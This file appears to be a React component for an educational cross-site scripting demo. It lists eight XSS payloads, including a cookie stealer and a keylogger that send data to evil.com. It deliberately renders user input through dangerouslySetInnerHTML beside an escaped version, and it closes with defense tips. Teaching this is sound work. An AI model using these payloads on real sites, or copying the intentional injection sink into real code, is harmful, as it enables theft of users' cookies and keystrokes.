import React, { useState } from 'react'
import { AlertCircle, Lock, Unlock, Shield } from 'lucide-react'
import { Card, CardContent } from '@/components/ui/card'
import { Badge } from '@/components/ui/badge'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'

const xssPayloads = [
  { name: 'Script Tag', payload: "<script>alert('XSS')</script>", description: 'Classic script injection', severity: 'critical', icon: '💀' },
  { name: 'Image Error', payload: "<img src=x onerror=\"alert('XSS')\">", description: 'Event handler injection', severity: 'high', icon: '🖼️' },
  { name: 'SVG Onload', payload: "<svg onload=\"alert('XSS')\">", description: 'SVG event handler', severity: 'high', icon: '📐' },
  { name: 'Anchor Tag', payload: "<a href=\"javascript:alert('XSS')\">Click Me</a>", description: 'JavaScript protocol', severity: 'medium', icon: '🔗' },
  { name: 'Style Injection', payload: "<div style=\"background:url('javascript:alert(1)')\">Styled</div>", description: 'CSS-based XSS', severity: 'medium', icon: '🎨' },
  { name: 'Cookie Stealer', payload: "<img src=x onerror=\"fetch('https://evil.com?c='+document.cookie)\">", description: 'Data exfiltration', severity: 'critical', icon: '🍪' },
  { name: 'Keylogger', payload: "<script>document.onkeypress=function(e){fetch('https://evil.com?k='+e.key)}</script>", description: 'Keystroke capture', severity: 'critical', icon: '⌨️' },
  { name: 'DOM Manipulation', payload: "<img src=x onerror=\"document.body.innerHTML='<h1>Hacked!</h1>'\">", description: 'Page defacement', severity: 'high', icon: '💥' },
]

function XSSDemo() {
  const [xssInput, setXssInput] = useState('')
  const [xssPreview, setXssPreview] = useState('')

  return (
    <Card className="border-red-500/20 bg-gradient-to-br from-red-500/5 to-card overflow-hidden">
      {/* Header */}
      <div className="bg-gradient-to-r from-red-700 to-red-900 p-5 relative overflow-hidden">
        {/* Shimmer */}
        <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/5 to-transparent animate-[shimmer_3s_ease-in-out_infinite]" />

        <div className="relative flex items-center gap-4 flex-wrap">
          <div className="w-12 h-12 rounded-full bg-black/30 flex items-center justify-center shadow-lg animate-[pulse-glow_2s_ease-in-out_infinite]">
            <AlertCircle className="w-6 h-6 text-white" />
          </div>
          <div className="flex-1 min-w-[200px]">
            <h3 className="text-xl font-bold text-white font-mono">
              Cross-Site Scripting (XSS)
            </h3>
            <p className="text-red-200 text-xs mt-1">
              Inject malicious scripts into trusted websites
            </p>
          </div>
          <Badge variant="critical" className="gap-1.5">
            <span className="w-2 h-2 rounded-full bg-red-400 animate-threat-pulse" />
            OWASP TOP 10
          </Badge>
        </div>
      </div>

      <CardContent className="p-0">
        {/* Attack Types */}
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 p-5 bg-black/10">
          {[
            { icon: '💾', name: 'Stored XSS', desc: 'Persists in database. Executes for every victim.', severity: 'critical', borderColor: 'border-t-red-500' },
            { icon: '🔄', name: 'Reflected XSS', desc: 'Payload in URL. Victim must click malicious link.', severity: 'high', borderColor: 'border-t-orange-500' },
            { icon: '🌐', name: 'DOM-based XSS', desc: 'Client-side script unsafely modifies DOM.', severity: 'high', borderColor: 'border-t-yellow-500' },
          ].map((type, i) => (
            <div
              key={i}
              className={`bg-zinc-900/80 rounded-lg p-4 border border-zinc-800 ${type.borderColor} border-t-2 hover:-translate-y-1 hover:shadow-lg transition-all duration-300`}
            >
              <span className="text-2xl">{type.icon}</span>
              <h4 className="text-sm font-bold text-foreground mt-2 font-mono">{type.name}</h4>
              <p className="text-xs text-muted-foreground mt-1 leading-relaxed">{type.desc}</p>
              <Badge variant={type.severity} className="mt-2 text-[10px]">{type.severity}</Badge>
            </div>
          ))}
        </div>

        {/* Payload Arsenal */}
        <div className="p-5 border-t border-zinc-800">
          <div className="flex items-center gap-2 mb-4">
            <span className="text-xl">🎯</span>
            <h4 className="text-sm font-bold text-foreground font-mono">PAYLOAD ARSENAL</h4>
            <span className="text-[10px] text-muted-foreground ml-auto font-mono">Click to inject</span>
          </div>

          <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 stagger-children">
            {xssPayloads.map((p, i) => (
              <button
                key={i}
                onClick={() => { setXssInput(p.payload); setXssPreview(p.payload); }}
                className="text-left p-3 rounded-lg bg-zinc-900/60 border border-zinc-800 hover:-translate-y-0.5 hover:border-red-500/30 hover:shadow-md hover:shadow-red-500/5 transition-all duration-200 cursor-pointer group"
                title={p.payload}
              >
                <div className="flex items-center gap-2 mb-1">
                  <span className="text-lg">{p.icon}</span>
                  <Badge variant={p.severity} className="text-[8px] px-1.5 py-0">{p.severity}</Badge>
                </div>
                <p className="text-xs font-semibold text-foreground font-mono">{p.name}</p>
                <p className="text-[10px] text-muted-foreground mt-0.5">{p.description}</p>
              </button>
            ))}
          </div>
        </div>

        {/* Custom Input */}
        <div className="p-5 border-t border-zinc-800 bg-black/10">
          <div className="flex items-center gap-2 mb-3">
            <span className="text-lg">⚡</span>
            <span className="text-sm font-semibold text-foreground font-mono">Custom Payload</span>
          </div>
          <div className="flex rounded-lg border-2 border-zinc-700 focus-within:border-red-500/60 focus-within:shadow-lg focus-within:shadow-red-500/10 overflow-hidden transition-all">
            <div className="bg-red-500/10 text-red-400 px-3 py-2.5 font-mono text-xs flex items-center border-r border-zinc-700 shrink-0">
              &lt;script&gt;
            </div>
            <input
              type="text"
              value={xssInput}
              onChange={(e) => setXssInput(e.target.value)}
              placeholder="Enter your XSS payload..."
              className="flex-1 bg-transparent border-none px-3 py-2.5 text-sm text-foreground font-mono focus:outline-none min-w-0"
              onKeyDown={(e) => e.key === 'Enter' && setXssPreview(xssInput)}
            />
            <Button
              onClick={() => setXssPreview(xssInput)}
              variant="destructive"
              className="rounded-none px-5 font-mono text-xs tracking-wider"
            >
              INJECT 💉
            </Button>
          </div>
        </div>

        {/* Live Comparison */}
        {xssPreview && (
          <div className="p-5 border-t border-zinc-800 animate-fade-in">
            <div className="flex items-center gap-2 mb-4">
              <span className="text-lg">🔬</span>
              <h4 className="text-sm font-bold text-foreground font-mono">LIVE COMPARISON</h4>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              {/* Vulnerable */}
              <div className="rounded-lg border-2 border-red-500/30 overflow-hidden bg-red-500/5">
                <div className="flex items-center justify-between p-3 border-b border-red-500/20">
                  <div className="flex items-center gap-2 text-red-400 font-bold text-sm">
                    <Unlock className="w-4 h-4" />
                    <span className="font-mono">VULNERABLE</span>
                  </div>
                  <Badge variant="critical" className="text-[10px] animate-pulse">⚠️ EXPLOITABLE</Badge>
                </div>
                <div className="px-3 py-1.5 bg-black/30 flex items-center justify-between">
                  <code className="text-[10px] text-muted-foreground">dangerouslySetInnerHTML</code>
                  <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
                </div>
                <div
                  className="p-4 min-h-[60px] text-sm break-all"
                  dangerouslySetInnerHTML={{ __html: xssPreview }}
                />
                <div className="flex items-center gap-2 px-3 py-2 bg-red-500/10 text-red-300 text-xs">
                  <AlertCircle className="w-3.5 h-3.5" />
                  Script executes! Attacker gains control.
                </div>
              </div>

              {/* Secure */}
              <div className="rounded-lg border-2 border-emerald-500/30 overflow-hidden bg-emerald-500/5">
                <div className="flex items-center justify-between p-3 border-b border-emerald-500/20">
                  <div className="flex items-center gap-2 text-emerald-400 font-bold text-sm">
                    <Lock className="w-4 h-4" />
                    <span className="font-mono">SECURE</span>
                  </div>
                  <Badge variant="success" className="text-[10px]">✓ PROTECTED</Badge>
                </div>
                <div className="px-3 py-1.5 bg-black/30 flex items-center justify-between">
                  <code className="text-[10px] text-muted-foreground">textContent / React JSX</code>
                  <span>🛡️</span>
                </div>
                <div className="p-4 min-h-[60px] font-mono text-xs text-muted-foreground break-all">
                  <code>{xssPreview}</code>
                </div>
                <div className="flex items-center gap-2 px-3 py-2 bg-emerald-500/10 text-emerald-300 text-xs">
                  <Shield className="w-3.5 h-3.5" />
                  Script escaped! Rendered as harmless text.
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Defense Strategies */}
        <div className="p-5 border-t border-zinc-800 bg-gradient-to-br from-emerald-500/5 to-transparent">
          <div className="flex items-center gap-2 mb-4">
            <span className="text-xl">🛡️</span>
            <h4 className="text-sm font-bold text-foreground font-mono">DEFENSE STRATEGIES</h4>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
            {[
              { icon: '🔒', title: 'Output Encoding', desc: 'Always encode data before rendering. Use textContent over innerHTML.' },
              { icon: '🧹', title: 'Input Sanitization', desc: 'Use DOMPurify or similar libraries to sanitize HTML.' },
              { icon: '📜', title: 'CSP Headers', desc: 'Implement Content Security Policy to restrict script sources.' },
              { icon: '🍪', title: 'HttpOnly Cookies', desc: 'Prevent JavaScript access to sensitive cookies.' },
            ].map((item, i) => (
              <div
                key={i}
                className="flex gap-3 p-3 rounded-lg bg-emerald-500/5 border border-emerald-500/15 hover:-translate-y-0.5 hover:border-emerald-500/30 transition-all"
              >
                <span className="text-xl shrink-0">{item.icon}</span>
                <div>
                  <h5 className="text-sm font-semibold text-emerald-400 font-mono">{item.title}</h5>
                  <p className="text-xs text-muted-foreground mt-0.5 leading-relaxed">{item.desc}</p>
                </div>
              </div>
            ))}
          </div>
        </div>
      </CardContent>
    </Card>
  )
}

export default XSSDemo
